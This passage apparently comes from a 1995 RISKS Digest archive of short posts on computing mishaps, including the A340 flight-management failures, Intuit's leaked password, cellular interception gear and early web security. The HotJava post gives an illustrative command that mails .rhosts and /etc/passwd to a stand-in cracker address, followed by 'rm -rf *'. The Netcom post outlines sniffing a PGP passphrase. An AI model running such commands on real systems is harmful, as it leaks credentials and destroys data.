adoption of this rule any longer, presumably at least in part because of the
effect of recent disasters on highway construction budget requirements.

Even without the DMV debacle the state might have decided to do this, but
perhaps one can hold them partially responsible for the declining quality of
legislation these days.

In Risks 15.79 I asked:
&gt;Perhaps one of your readers can explain how the Midwest edition of *The New
&gt;York Times* today had a photo on the front page with the caption.  "Joseph P.
&gt;Kennedy Jr. being arrested at the White House yesterday", with no further
&gt;explanation or story anywhere in the paper?
 
Several respondents have reported that, in the Metro edition, the explanation 
was found in three paragraphs at the end of the adjacent story about Haitian 
refugees. Apparently these paragraphs were cut by the person who made up the 
continuation page in the Midwest edition, leaving Joe Jr. hanging there
on page 1. (Yes, I checked back and they are not there in my copy).

According to the "Boston Globe", Congressman Kennedy and several other
colleagues (7 or 8?) were arrested for demonstrating in protest of the US
government's policy on Haiti.  The arrests were made by the Park Service
police.  My guess is that the congressmen had every intention of getting
arrested as a way of increasing publicity.

The error was in a correct, but misleading caption.  We usually assume that
when a politician is arrested it is unintentional.

For what it's worth, my wife asked the same question, and she was looking
at the New York Metro/Suburban edition.  While I can't speak with any real
authority about the Midwest (national) edition, I will say that in my
experience the first page doesn't change much; the big difference is in the
metro section: the national editions don't carry the local stories.

The picture with the caption ("Joseph P. Kennedy Jr. being arrested at the
White House yesterday") accompanied the story about the Administration's
policy on Haiti.  While there was no mention of Rep. Kennedy anywhere in
the story, it did state that (quoting from memory) "four members of the
House of Representatives were arrested during a protest at the White
House."  To my eye, this is sloppy copy editing, not a bona fide technology
blunder....  The technology does seem to encourage such sloppiness, though,
a fact to which our moderator (and the RISKS archives) will bear witness.

Sorry - I was mistaken when I claimed that LaMacchia was arrested.  The
correction noted by Tim Shepard and Douglas Rand in <A HREF="/Risks/15.79.html">RISKS-15.79</A> was
accurate.

As to the issue of his intent to pirate software, that was not the charge
against him.  It was wire fraud! I have read the copy of the indictment and
commentary and I find this awfully strange.  Furthermore, I find little if any
substantive evidence of intent to pirate software in my reading of the quotes
from the indictment.  If you assume he is innocent and ask yourself if these
comments could have been innocently made by a person of that age in that
environment, you may find that the assertion of guilt is not warranted.

Those of us who have been around the computer world for any length of time have
seen a great many "How to Buy a PC" seminars, articles and user group meeting
talks.  They generally offer a lot of helpful advice and useful information for
the novice.  I have, however, often noted personal bias being delivered with
the same force and weight as known and tested fact.  The neophyte generally
comes away with a much better knowledge of the computer market--but also with a
number of unsubstantiated prejudices.
 
Here, then, is a book on the same topic.  Containing far more material than any
one-hour talk or magazine article, it nevertheless has some of the same tone. 
Those wise in the ways of computer purchasing will many times breathe an
"Amen!" to much of what is here.  There are also, however, personal biases and
blind spots that the newcomer will have difficulty recognising.
 
Chapter one is a general diatribe against the industry as a whole.  As
vitriolic as it may sound to the newcomer, the authors may, in fact, be
*under*stating the case.  Chapter two states that software is central to the
whole process, and gives tips for evaluating the major applications.  The
remaining eight chapters are devoted to hardware.
 
There are some easily identifiable oddities.  The statement that Windows'
management of resources makes things easier obviously comes from someone who
has never had to check the five completely different print menus under Windows
to find out why nothing is coming off the printer.  Some items seem to be
subject to time lag, as with the insistence that 386 and 486 CPUs are maker-
independent.  (This might have been true earlier, but the 486 market is now an
utter shambles.)  The authors still cling to their claim that all surge
protectors are created equal.  I found the section on virus protection to be
fairly reasonable--except that they still get the Stoned message wrong, think
all scanners are equally effective, and don't know about shareware scanners. 
In fact, shareware doesn't get much of a shake in spite of the railing against
overpricing and software bloat.
 
In addition, some of the recommendations for protection may give a false sense
of security.  The authors frequently repeat the refrain that one should never
by anything with cash or cheque: put it on a credit card so that you will have
some fallback.  The use of a credit card, however, does *not* necessarily
protect you.  Once you sign the charge slip, you are committed to honour that
debt.  The credit card company *may* choose to reverse the charge and not pay
the merchant, but that is at *their* discretion, and they are not automatically
on your side.  (The credit card company may take several months even to decide
whether or not to reverse the charge: the representatives I talked to, at the
credit card service office, the local bank, the head office complaint
department and the head office PR office refused to give any upper bound or
time limit for a decision.  The PR department initially stated that paying by
card was the same as paying by cash, but refused to answer when asked to
comment specifically about the case of defective equipment.)
 
You really are alone out there: I recently checked up on the Better Business
Bureau, and found that while the technology the BBB is using for phone access
to reports is impressive, the reports themselves are less so.  A company which
has had several disputes in the past, and has a current dispute outstanding, is
listed as being in "satisfactory" standing, and the BBB had "received no
complaints" during its existence.  The BBB also had a chance to respond to this
and indicated that it was because of their "standard reporting language"
imposed from head office.  (BBB is a franchise.)  Complaints are not entered
into the automated system until proven, beyond doubt, to be "valid": the
consumer is not allowed an opportunity to respond to the final offer from the
merchant.  Decisions on validity are made by the BBB.  The BBB is paid by the
vendor.  The conclusion is left as an exercise to the reader.  (The General
Manager of the local BBB stated that more detailed information is available
from the counselors, although this is not made at all clear from the automated
system.  I checked this out later, and it turns out not to be the case.  She
also stated that most people deal with the counsellors rather than the
automated system, which doesn't surprise me in the least.)
 
In the absence of any better, though, this book is to be recommended for
beginners *before* they buy a computer.  One of the particularly nice features
is a sample advertisement introducing every chapter and dissected for "lies". 
Get some street smarts before you go buy a PC.  And never buy anything on the
spot.

An article, Dismissal of Security Expert Adds Fuel to Internet Debate, by
John Markoff in The New York Times, 22 Mar 1995, discusses last Monday's
departure of Dan Farmer from Silicon Graphics.  <A HREF="/Risks/16.90.html">RISKS-16.90</A> noted that Dan
and Wietse Venema have developed SATAN, a Security Administrator Tool for
Analyzing Networks, which Dan plans to release openly to the world on 5 Apr
1995.  

RISKS has frequently seen discussions of the pros and cons of making such
tools available.  If the knowledge of vulnerabilities is not promulgated,
the system flaws and configuration weaknesses do not seem to get fixed, and
that knowledge seems to permeate the malicious-hacker community anyway.  If
the knowledge is promulgated, then the likelihood of exploitations tends to
increase -- although it certainly provides an added incentive to clean
things up in a greater hurry.  

Dan is at the center of this renewed controversy.  Markoff's article
includes this statement:

  In the Internet community, Farmer's case is seen as symbolizing the
  conflict between a time-honored ideal the free flow of information in
  cyberspace and the harsh new reality that corporations and government
  agencies must protect their computer systems against intruders and vandals
  armed with increasingly sophisticated break-in software.

There has been some discussion in recent issues of cellular phone monitoring
in Pakistan. Nobody has mentioned that this technology is currently
available off the shelf in the US from Harris Communications (Melbourne FL,
address on request).

The Harris "Triggerfish", from a photo in an ad, looks like a laptop
computer with an extra box alongside. "Everything you need fits into a a
suitcase" in the words of the ad.

It will allow collecting and analysis of dialed number statistics,
Identifying the telephone number when it is registered under another persons
name or an alias, and developing usage patterns.

"Wiretap applications..... provide audio minimization, on/off hook logging,
multiple tape recorder outputs and necessary intercept documentation. A
headphone jack with volume control and alarm speaker allows the monitoring
agent to intercept each and every communication." (From Harris brochure)

The brochure goes on for several pages but I think you get the idea. This is
a wiretap in a suitcase. As it is listening to radio waves, there is no way
of anyone, including the gov't, knowing when it is being used.

The Triggerfish is sold only to law enforcement agencies and is *supposed*
to be used only with a court order permitting a wiretap. The risk is, who is
to know if and how it is being used?

The brochure was reproduced in a newsletter that I used to get. I don't know
how old it is but at least 1, possibly 2 years. I found an undated copy in
my desk drawer when I was cleaning house the other day.

So what's the fuss with Pakistan and Motorola? Perhaps somebody
should give them Harris' phone number.

We have debated and called to attention the troubles involved with
non-standard interfaces, such as the power switch on the keyboard of the Mac
and the like.

Here's a new one I heard on the radio last night.

According to a study released yesterday (sorry, I didn't write down the name
of the study), the post-admittance treatment lag for heart attack patients
in hospitals could be reduced from an average of 70 minutes to 30 minutes if
the interfaces on the equipment used to treat these patients were standard.
This was based on (so the announcer said, I have not seen the study) a
hospital where every unit of equipment of type "x" (say, a defibrillator) was
purchased with a standard interface. The treatment time went down because
the personnel didn't waste time looking for the CHARGE button, instead they
knew where it was.

This is a truly amazing claim. If it is true, I would think the business
case for purchasing standard equipment in a hospital would be quite strong,
even if it was built only on liability reduction.  Never mind the fact that
2 patients can be treated in the same window on time that one could before,
or that your ROI for each unit of equipment would be higher due to the
higher use.

On a related tangent, I was recently in the hospital. The nurse hooked me to
an IV, but the flow rate was too low; she went to get a pump. She hooked me
into the pump, but couldn't get it started.  When she did get it started,
the rate was too low and the alarms were going off. She couldn't figure out
the interface. I turned the IV pump to face me, and read the large amount of
fine print on the side relating to the pump's operation. It turned out she
needed to input the size of needle she was using to adjust the flow rate;
she was using a small butterfly needle instead of the default needle, which
is larger.

I heard on the radio news this morning (KGO 810 AM, about 11 AM) that a
planeload of Taiwanese passengers thought their plane had been hijacked when
it landed on a small island instead of at the capital Taipei during a
domestic flight.

The destination had been changed, and all the passengers knew it, but no one
told the pilot.

I would speculate that the scheduling system held the correct information,
so that the displays in the airport directed all the passengers which plane
to get onto, but that there is no direct computer link to the airplane, and
either no one realized that the pilot needed to be told "manually", or the
person responsible flaked.

I just got a grant announcement from ARPA, discarded it in disgust, and then
read Cliff Stoll's newest book, ``Silicon Snake Oil''.  That led me to
dredge the announcement out of the wastebasket, because it's such a perfect
example of how much snake oil and snake-oil salesmen have come to permeate
our field!

DARPA SOL BAA95-21 DUE 052495 POC states that "Proposed research should
investigate innovative approaches and techniques that lead to or enable
revolutionary advances in the state-of-the-art.  Specifically excluded is
research which primarily results in evolutionary improvement to the existing
state of practice ..."

It seems to me that this wording is a specific invitation to snake oil
salesmen and that it explicitly and openly promises to discriminate against
an honest proposal that makes a realistic projection of the likely outcome
of the proposed research.

In general, my experience leads me to believe that research projects that
actually produce revolutionary results rarely anticipate them, and research
projects that promise revolutions rarely deliver!  I don't deny that the
projects funded on the promise of revolution haven't occasionally delivered
interesting results, but I greatly detest a system that demands such empty
promises as a condition of obtaining funding.

In any case, ``Silicon Snake Oil'' is a book worth reading.  Computer
professionals will find it alternately infuriating, when it attacks our
specialties, and rewarding, when it attacks all that hocum everyone else in
the field has been pushing.

Some time ago, RISKS ran an article about a long distance company offering
an 800-operator service for discounted Collect calls.  A competitor soon
realized that *many* folks were dialing 800-operatEr. The competitor soon
chartered this number for their own, strikingly similar (some would say
indistinguishable to the naked ear) service and raked in the stray dialers.

National Public Radio ran a piece last week telling of another similar
incident.  A small mom-and-pop company called "The wooden Boat store" was
getting thousands of misdialed calls per month for an MCI 800 service.  The
small business contacted MCI about the problem and when MCI didn't offer any
help, the Wooden boat store approached AT&amp;T.  Within 1 week, AT&amp;T had set up
a "voice mail" message that said something like "Welcome to the wooden boat
store. Press 1 for AT&amp;T Operator assistance, or press 4 for the Wooden Boat
Store" Note that AT&amp;T did not offer to connect to the intended, originally
misdialed MCI service!

Les Hatton reports in <A HREF="/Risks/16.92.html">RISKS-16.92</A> on an incident involving an Airbus A340 on
a trip from Japan to London Heathrow. The aircraft is one of the
A320/330/340 (also A319/321) family of Airbuses, some of whose primary
flight control systems are computer-controlled (that is, the pilots
control-stick movements are input to a computer that guides the control
systems).  The A340 is a very long-haul aircraft, capable of flying the very
longest routes without refueling (it holds the world record for length of
route flown without refuelling, for normally-equipped civil transport
aircraft).  The incident is of greatest significance for RISKS readers
because it is the first time that an accident report on an A320/330/340
series aircraft specifically cites software and hardware reliability as the
main problem.

The incident concerned a Virgin A340 at Heathrow on 19 September 1994 (cf.
the incorrect info reported by Hatton). A short article by Christian Wolmar
appeared in The Independent newspaper, one of Britain's major dailies, on
Wednesday March 15, 1995. After talking to Christian, I obtained a copy of
AAIB (Britain's Air Accident Investigation Board) Bulletin No. 3/95, the
report on the incident.

I'll spoil the tale for everyone by giving the punchlines first: the
description of the problem areas identified during the incident, and the
report's conclusion, the `Safety Recommendation 95-1'.  [during quotes, my
editorial comments and elisions are contained within square parentheses such
as these. PBL.]

[begin quote]

Problem Areas

The AAIB identified and investigated the following problem areas: RTF [radio
communication] phraseology; ATC [air traffic control] vectors and ILS
[instrument landing system] performance; fuel quantity indications; double
Flight Management Guidance System (FMGS) failure and aircraft type
certification.

[end quote]

The radio phraseology can be ignored by RISKS readers.  ATC vector problems
had to do with capturing the `glideslope', the radio beam angled up into the
sky from the end of the runway, down which an aircraft flies in order to
land, under instrument conditions.  The aircraft at one point encountered a
`false glideslope' at about 9\deg at 5 miles from touchdown and 4,800ft
altitude caused by a `shallow sidelobe' of the ILS. Such problems are known
(glideslope is assured for between 1.35\deg and 5.25\deg in the UK) and the
airplane wouldn't have got there had it not been vectored there by ATC - but
one hastens to add that normally this is not a problem. Just in this
case....see below. All the other problems concern the on-board computers,
and the AAIB has written to the JAA (Joint Aviation Authority, which does
for Europe what the FAA does for the USA) to determine if the JAA was "aware
of some of the more significant shortcomings of the A340's fuel and flight
management systems before the type certificate was granted".

[begin quote]

Safety Recommendation.

It is recommended that the reliability of the Airbus A340 FMGS and the fuel
management system should be reviewed to ensure that modified software and
hardware required to achieve a significant improvement in reliability should
be introduced as quickly as possible and the subsequent system performance
closely monitored.

[end quote]

Here is why they made this recommendation:

[begin quote]

Autopilot and Flight Director heading performance

The reason for the wrong response of the autopilot and one flight director
to the left turn demand was a software error [...] [This error] was known to
Airbus Industrie and corrective measures for this and several other software
deficiencies were contained in [...] standard L-5 that has been issued and
incorporated in most A340s on the UK register.

Fuel Quantity indications

In July 1994 Airbus Industrie issed an Operations Engineering Bulletin on
the subject of fuel quantity indication. [The bulletin gives detailed
descriptions of anomalies, when they occur, and how to take them into
account.]  Action pending by Airbus Industrie to correct fuel quantity
errors involves the installation of five additional fuel probes in each
inner tank and software standard 6.0. Action to correct CG control errors
[the center of gravity is adjusted in cruise by moving fuel around, to give
efficient cruise performance] is contained in a software only upgrade to
standard 6.1. [...]

FMGS double failures 

After landing the aircraft's Central Maintenance System had logged a fault
in No 2 FMGEC. This was removed and sent to France for data extraction and
fault analysis. No fault was found within the hardware and a comparable
software fault could not be reproduced on the test bench.  Nevertheless, the
BITE data dump showed that at 1435 hours the No 2 FMGEC had detected a CLASS
1 HARD failure within itself and a simultaneous fault within FMGEC No 1. The
investigation was complicated by the involvement of several sub-contractors
in the manufacture of the FMGEC and its database.

[...]

Airbus Industrie were aware of the double FMGS failure mode that had first
emerged on the A320 series aircraft. On A320/330/340 aircraft, each FMGEC is
linked to its own set of peripherals and inertial reference system. Both
FMGECs achieve their own computations and exchange data through a cross talk
bus. One FMGEC is declared as master and the other as slave; the master
FMGEC is related to the engaged autopilot. Some data in the slave FMGEC is
synchronised to the master but all data inserted on any MCDU is transferred
to both FMGECs and to all peripherals.

According to Airbus Industrie, there are several ways in which the exchange
of data and/or a problem in one computer can affect the other computer.
Often the computers reset themselves after a few seconds but occasionally a
fault results in repetitive resets or attempts to resynchronise. The fifth
reset relatches the computer, which will not recover without a power
interrupt. Reset breakers for manual power interrupts are on the flight deck
overhead panel. Dual resets occur when both FMGECs encounter failures at the
same time.  They generally occur after a pilot entry that involves use of
the navigation database or to an event synchronised between both flight
management systems. Latched double failures usually occur if pilots
successively perform three inputs that cause a reset, or if an `impossible'
computation of predictions occurs.

Airbus Industrie have succeeded in radically reducing the frequency of
double FMGS failures on the A320 series aircraft; they are also addressing
the problem on the A330 and A340 series. [...]

[end quote]

I point out that so-called Byzantine failure modes and algorithms for
avoiding them in distributed systems were first identified and studied in
the 70s by my former SRI colleagues Lamport, Shostak and Pease under the
auspices of the SIFT project, and since then by many, many others. As for
other such topics in computer science, this was regarded as `theory' for a
few years. I could hazard a guess that many aerospace engineers still have
not heard about this area. The account above of the problems with the
A320/330/340 master/slave FMGECs may give RISKS readers reason to inform
themselves about the `theory' of how all this anomalous and possibly
dangerous behavior can be avoided in the first place. Many papers in the
January 1994 issue of the Proceedings of the IEEE speak about the current
state of the art.

Finally, the story.

On the ground in Tokyo before departure, one FCMC indicated numerous faults.
It is accepted procedure to depart with only one FCMC operative - they did
so, and followed the appropriate procedures for calculating fuel with only
one FCMC. Early in cruise, the map symbology on the commander's EFIS
(Electronic Flight Instrument System) disappeared and his MDCU
(Multifunction Control and Display Unit) ceased calculating.  They slaved
both off the copilot's DMC (Display Management Computer).  The EFIS is the
pretty screen in front of the pilot that tells himher which way is up, which
way is forward, and which way, as well as how fast (in three dimensions),
and where heshe is.  The MDCU displays flight plan info, and a bunch of
other things. About an hour later, they found that the commander's EFIS had
restored. Logical indications from the No.2 FCMC were also restored later by
`resetting the computer'.

Now come a few things which one should really think about hard.

Getting close to home (Heathrow), the copilot tuned in the Lambourne VOR (a
radio beacon) manually, to ensure that the EFIS displays were still
accurate. They were cleared to fly direct to the beacon, but a few miles
east, "the commander's EFIS map display symbology froze and lost all
computed data [..]. His MDCU displayed the message `PLEASE WAIT' together
with a page normally seen only when loading in data before flight. He was
unable to obtain any other display. At [roughly the same time], the
[copilot's] EFIS and MCDU exhibited identical behavior."

Notice that not all flight control info was lost from the EFIS - they could
still fly the airplane. They `dialed in' the ILS using a "back-up method",
and while doing so received an ECAM warning of low fuel state and
instructions to open crossfeeds (airplanes like this have many tanks and
fuel is pumped around between them). The warning reoccurred and readings
indicated they had some 2 tonnes (2000kgs) of fuel less than expected.  They
discussed traffic density with ATC, and eventually declared an emergency in
order to get priority for landing.

They had the autopilot automatically capture the ILS, which is when they hit
the sidelobe. `The glidepath bar moved rapidly down the ILS display before
moving rapidly up once again; the autopilot's attempt to follow the
glidepath resulting in unusually high pitch rates and so the autopilot was
disconnected.' The commander informed the tower they were having problems
with the glideslope and requested an SRA (Surveillance Radar Approach). In
an SRA, the controller talks the airplane down localiser and glideslope
continuously, by giving an uninterrupted stream of position information
relative to the glideslope/localiser pair. It's very impressive.

Aircraft are on `final approach' when they're lined up with the runway
centerline and heading down the glideslope to land. (This should not be
confused with when the flight attendant says `final approach' to the
passengers, which is usually when the aircraft is even before *initial*
approach phase.) The approach was for Runway 09 Right at LHR (the `09' means
that it's pointing roughly 90\deg to North). The crew were on the SRA, being
vectored (given magnetic headings to fly) to intercept the final approach
course. They were flying a heading of 180\deg and were commanded to change
to 130\deg.  When they turned the heading selector knob on the autopilot,
both commander's and copilot's heading `bugs' moved correctly (that's an
indication on the directional gyroscope of which heading you want the
autopilot to fly to and hold - I had a lower-tech version on my Piper
Archer), but the flight director bars went in opposite directions and the
airplane followed the false movement of the copilot's bar, and turned right
instead of left. At this stage, the copilot disconnected autopilot and
flight directors and flew the plane `manually' (see first paragraph for why
this is not quite an accurate expression for these aircraft).

They landed without further incident; after taxiing in and shutting down,
the fuel indications recovered; and thankfully everyone lived happily ever
after.

I'm not sure you need to invoke Byzantine failures to explain the problems
reported with the double FMGS failures in the Airbus A340 and its relatives,
though Byzantine-fault-tolerant architectures are simpler and more regular
than others -- and might therefore be less prone to bugs.

A Byzantine failure is usually interpreted as a hardware fault that cases
the errant device (e.g., a sensor) to provide conflicting information to the
systems that interrogate it.  These faults can be masked by suitable
Byzantine-fault-tolerant algorithms (invented, as Peter correctly points
out, by Pease, Shostak and Lamport during the SIFT project at SRI.
Incidentally, you can retrieve a picture of SIFT, and of Pease, Shostak, and
Lamport via WWW at URL <A HREF="http://www.csl.sri.com/ft-history.html">http://www.csl.sri.com/ft-history.html</A> ).

However, Byzantine hardware faults don't seem to be the problem with the
A340 FMGS--rather, it seems to have been a plain bug in the redundancy
management.  And from the description, it seems that the reason there are
bugs is that the design of the system is not amenable to comprehensive
analysis and thorough comprehension.  The great contribution of Lamport et
al. was the "state-machine" approach to fault-tolerant system design
(tutorial reference at bottom).  The advantage of this approach is that it
provides a relatively simple architecture that can provably tolerate ANY
KIND of fault, up to some number.  In contrast, the type of architecture
used in most aircraft systems is based on FMEA, where you explicitly try to
anticipate and counter each specific kind of fault.  This leads to
complexity, and thence to bugs, and also to the possibility of overlooked
fault modes (and, more likely, overlooked COMBINATIONS of faults).  The
disadvantage of the state-machine approach is that it requires a lot of
redundancy (3n+1 channels to withstand n simultaneous faults).  This is
overcome, to some extent, by the "hybrid" fault-models introduced by the
people at Allied Signal who developed the MAFT architecture.  (There's a
paper by them in the issue of the IEEE proceedings that Peter mentions).
MAFT is the only architecture for primary flight control developed by a
manufacturer of these things that uses the state-machine approach.  It was
proposed for the 7J7 and 767X, but Allied dropped out of the bidding after
Boeing cancelled these and then invited new proposals for the 777.

Systems above the PFC (primary flight control/computer) level usually seem
to use dual, or dual-dual redundancy rather than the quad-and-above found in
PFCs.  The state-machine approach may not be appropriate here, but I'd hope
that ideas from modern fault-tolerant design, and from formal
state-exploration and verification could add something.

As an aside, the mechanisms of fault tolerance, distributed coordination,
concurrency management, etc. employed in aircraft systems owe little to
those studied by academic researchers.  For example,

  Not far from there (CNRS-LAAS a research center concerned with
  fault-tolerance), Airbus Industries builds the Airbus
  A320s.  These are the first commercial aircraft controlled solely by a
  fault-tolerant, diverse computing system.   Strangely enough this
  development owes little to academia.  (IEEE Micro, April 1989, p.6)

Of course, there is little reason to suppose that academic researchers know
more about fault-tolerant architectures for avionics systems than those who
actually develop them, but it does mean that the architectures and
mechanisms used in aircraft systems cannot draw on the extensive analyses
and (in some cases mechanically checked) proofs that have been published and
subjected to peer review in computer science journals.

We've done lots of work applying formal methods to algorithms for

[You can get the redundancy down to about n &gt;3a+2s+m where a, s, and m are
the numbers of arbitrary (Byzantine), symmetric (wrong but consistent),
and manifest (obvious, or crash) faults to be tolerated simultaneously.]

Regarding FBOI having an account on Netcom...

While I can understand a startup company "renting cheap office space", one
would think that a new financial institution wouldn't keep its valuables
in the electronic equivalent of a public square.  There are many, many
ways to break Unix security - at the very least, any netcom sysadmin could
read and alter FBOI's files, and very likely there are many hackers who know
about holes in netcom's system.

If the PGP decryption is to take place on netcom's computers, rather than a
private CPU within FBOI's "offices", then the cleartext passphrase will exist
in memory where it can be accessed by anyone who can acquire root privileges.
In addition, the encrypted secret key would have to be stored online, so it
can be copied by an intruder, and one can use a program (trace? I don't
recall) that displays all the system calls that a program makes in order to
monitor the keystrokes that FBOI's operators make while entering the 
passphrase to decrypt the secret key.

I consider it the height of irresponsibility to operate a financial service
on a public access Unix system.  Netcom might consider whether they would be
liable in the event of a security breach.

If you could make $100,000 by hacking an OS known to be as impregnable as
swiss cheese, and you didn't have the ethical sense to stop you, wouldn't you
put some effort into making off with the goods?

Contending for software screw-up of the year, Intuit Inc., publishers of
Macintax, have copped to yet another flaw in their tax reporting software.
According to an article by Peter Lewis in The New York Times, 24 Mar 1995,
information [password, phone number] included in a Macintax debug file that
came with the standard distribution disks of the product enabled users to
log into the master computer used by Intuit to store and file Macintax
user's returns.
<P>
Once logged into the master computer, a user could reportedly download,
modify or delete other people's returns. The offending information was a
login ID and password for Intuit's master computer that was apparently
included in a debug file in plain text! The security hole was reported by an
unidentified user in E-mail to the NYT. Once Intuit was made aware of the
screwup they reportedly corrected it, but could give no assurances that any
of the 60,000 tax returns in the master computer hadn't been compromised.
<P>
Encryption is not used in the Intuit's product [but was intended to be].

<I>Fri, 24 Mar 1995 13:06:58 -0500</I><P>

[A _Washington Post_ article on 24 Mar 1995] reported that Intuit learned of
the problem "yesterday" (apparently Thursday, 23 March) from a customer's
call; according to the customer, he had been able to log onto the Unix
account and peruse the files there.
<P>
Also according to Intuit, the UNIX account is used only as a staging area,
and is swept to some other facility every eight hours.  Mark Goins (Intuit
VP of personal tax group) says that no more than 300 returns are in the
account at any time.
<P>
A rather scary bit of spin control by Intuit is reported in the article:
it quotes Bob Barr (identified as "vice-president of electronic services"
at Intuit) as downplaying the exposure:
<BLOCKQUOTE>
    If a curious customer programmed his or her computer
    to dial up the number and supplied the password [from the
    plaintext file], they would have entry to the database 
    holding the files.  Even so, Barr said, the person would
    have to have some familiarity with a computer programming
    language called UNIX [sic!], which is commonly used on the
    Internet, to peruse or alter any files.
</BLOCKQUOTE>
as if knowing how to use UNIX commands is so rare a skill that its
use offers security.  It is, of course, possible that the reporter
mangled Barr's comment, but readers of RISKS-FORUM are all too
familiar with what can be done by someone who gets unauthorized access
to sensitive data.
<P>
This has definitely *not* been a particularly good year for Intuit.

"Gibberish puts searchers off the scent", New Scientist, 25 February 1995: 
<P>
[Companies use professional patent searchers to determine the existence of
patents covering a particular subject and thus avoid later legal problems.
However, the electronic patent indexes contain errors which may give false
results in searches.]
<BLOCKQUOTE>
  In the European Patent Office's index, for example, he found an organic
  compound in the phthylenone group which is indexed as an "ogthylene-3-one"
  -probably because the typists hand had slipped one key along the keyboard.
  [...]  Most mysterious of all, Steele [a professional patent searcher] found
  entries in the EPO's international Inpadoc database for patent applicants
  called Robaato Uiraaton Furemingu, Uiriamu Bii Reisufuiirudo, Bii Oo Shii
  Guruupu and Kuringe Fuarama.
<P>
  By digging out other patents with cross-indexed numbers, Steele decoded
  the names as Robert Willerton Fleming, William B. Laceford, the BOC Group
  and Klinge Pharma.
<P>
  Inpadoc's headquarters in Vienna automatically collates data from computer
  tapes supplied by 56 patent offices around the world. The Japanese tapes
  contain names which have been translated from Western originals into
  pictorial characters and back again by computer. The result is often
  gibberish, and there is no provision for human checking.'
</BLOCKQUOTE>
[Obviously the potential legal problems arising from a faulty index could
have serious financial consequences. It also leaves the possibility of a
patent office awarding two patents for the same invention to different
people if the first patent submitted is mis-indexed.]

Paraphrased from a feature article above-the-fold on the front page of the
*San Jose Mercury News* for 23 March 1995:
<BLOCKQUOTE>
	"Why Sun thinks Hot Java will give you a lift"
<P>
    Sun will be releasing a new Web browser next week that does more than
    download pictures and text that just sits there.  A demo showed a
    financial planning application with a ticker of selected stocks scrolling
    across the screen with up-to-the-minute quotes.
<P>
    The Hot Java browser downloads small software programs, which
    then run on the client (Sun SPARCstations running Solaris-2.x).
</BLOCKQUOTE>
My immediate reaction was: this is a bad thing unless the client browser
runs the downloaded program in an interpreter that has very limited
capabilities.  Otherwise a fancy-looking Web page may be sending the
equivalent of
  system("head -999 .rhosts /.rhosts /etc/passwd | mail <A HREF="mailto:cracker@hacker.org">cracker@hacker.org</A>")
or "rm -rf *" to your browser.
<P>
Following the URL in the newspaper article, I found that <A HREF="http://www.sun.com">http://www.sun.com</A>

On the 25 March Beakman's World, a young people's "science" show on CBS,
they answered a viewer's question about how video games work by showing 
how to write a simple program.  They finished program was as follows:
<P>
IF liza hits the button<BR>
THEN Lester picks up ball<BR>
THEN Lester throws the ball<BR>
AT TARGET
<P>
This program was not written correctly at first.  The first bug was that the 
programmer, Liza, forgot the line "THEN Lester 
picks up ball", so the giant lab rat threw his arm with no projectile.
This corrected, she tried again having neglected to specify "AT TARGET", 
leaving the pitcher to throw in all directions but that desired.
<P>
As a result, young budding (unemployed) computer programmers were exposed 
to the concept of risk in the case of incomplete system development.
<P>
But the viewers may have already surpassed this programming their home 
computers.

Subject: A slight change in flight plan
<P>
The BBC news at 08.30 reported a slight problem which occurred on the
morning of 15 Mar 1995 with the ultra high-tech, packed full of software and
therefore utterly wonderful Airbus A340.
<P>
Apparently on the final part of its approach to Gatwick, both the pilots
screens went blank, to be replaced by a polite little message saying "Please
wait ...".  Somewhat unnerved, the pilots requested that the plane turn
left, but it turned right instead.  They then tried to get it to adopt a 3
degree approach to the runway, but it chose a 9 degree plummet instead.  At
this point, from the report, they appeared to gain manual control and landed
safely.  It is not clear who will pick up the dry-cleaning bill.

Since yesterday a new 'open border' regulation is in power in the
so-called Schengen countries. These comprise, as I believe, Belgium,
the Netherlands, Germany and France.
 <P>
With this open border thing, it is not necessary to have a passport
or other ID anymore when crossing a border between this group of countries.
 <P>
There is a check built in of course: on checking in, one gets a paper card
with a magnetic strip, this strip containing no personal information, but
only a date and time.
 <P>
On arrival in the other country, one can straight pass through a turnstile,
without any ID being checked. ID checks are allowed though.
 <P>
Anyway, in case of loss of this card, one can present his or her passport
and get in.
 <P>
It seems at least some people have already used another persons paper
card to get into a country.
 <P>
For this reason Paris still has the passport check, even though they
are supposed not to.
 <P>
I wonder how anyone, even politicians, can come up with such a buggy system.
<BLOCKQUOTE><I>
   [It is EASY, especially for politicians.  PGN]

As risk I see not only the possibility of criminals gaining easier access,
but also the possibility of 'random' checks on 'suspicious' looking people,

Ry Jones &lt;<A HREF="mailto:ry.jones@mccaw.com">ry.jones@mccaw.com</A>&gt; reported an unspecified study and personal
experience as argument in favor of "standard" interfaces for medical
equipment.  It is not controversial that such "standards" would be a good
idea, most of the discussion of designing and implementing such standards
amounts to Mom-and-apple-pie type statements.  Indeed, I have been critical
(Cook et al., Evaluating the Human Engineering of Microprocessor Controlled
Operating Room Devices, Journal of Clinical Monitoring 7:217-226,1991) of
attempts to introduce human engineering guidelines for medical equipment
because such guidelines necessarily represent a least- common-denominator
approach an end up ignoring the real cognitive consequences of using
microprocessor based technology.  Indeed, successful standards (e.g. the
ASTM's standard for the color and type on user applied drug labels for
syringes used during anesthesia, the ANSI standards for anesthesia machine
layout, color and pin index coding of gas lines, etc.) are nearly all
related to narrow mechanical issues and represent the rather stable
consensus of manufacturers and users regarding a very limited range of
issues.
<P>
To claim that a certain improvement in human performance would be achieved
by the production of a certain sort of standardization is assuredly untrue.
As indicated above, it is nearly impossible to produce such standards.  More
importantly, the claim that a certain benefit can be obtained is simply weak
counterfactual reasoning; it assumes that performance is derived from narrow
limitations and that these can readily be overcome for all practitioners.
There is, to my knowledge, no reliable or persuasive data suggesting that
this is true in any real sense.  Even in similarly complex, high consequence
domains (e.g. commercial aviation, military systems, nuclear power plant
operations) where efforts to produce such improvements have been intense and
sustained there are virtually no credible studies indicating quantity of
benefit derived from such standardization.
<P>
Many people who have only peripheral exposure to medicine are amazed at the
technological complexity of current practice.  It is clear that devices pose
a problem for operators, in part because they are poorly designed and poorly
manufactured (cf. Cook, et al., Unintentional Delivery of Vasoactive Drugs
With and Electromechanical Infusion Device.  Journal of Cardiothoracic and
Vascular Anesthesia 6: 238-244, 1992, Cook &amp; Woods, Adapting to New
Technology in the Operating Room, in press) defining precisely how they are
bad demands detailed knowledge of the cognitive consequences of aspects of
their design which, in turn, requires detailed understanding of the
cognitive tasks of their users.  It is far from easy to produce adequate
guidance for the development of devices or for their evaluation, although
the FDA is interested in doing so.
<P>
The nature of the problem with infusion devices and their programming is
actually quite common and the problems associated with their use are many.
What is remarkable, for those of us who study these issues, is that human
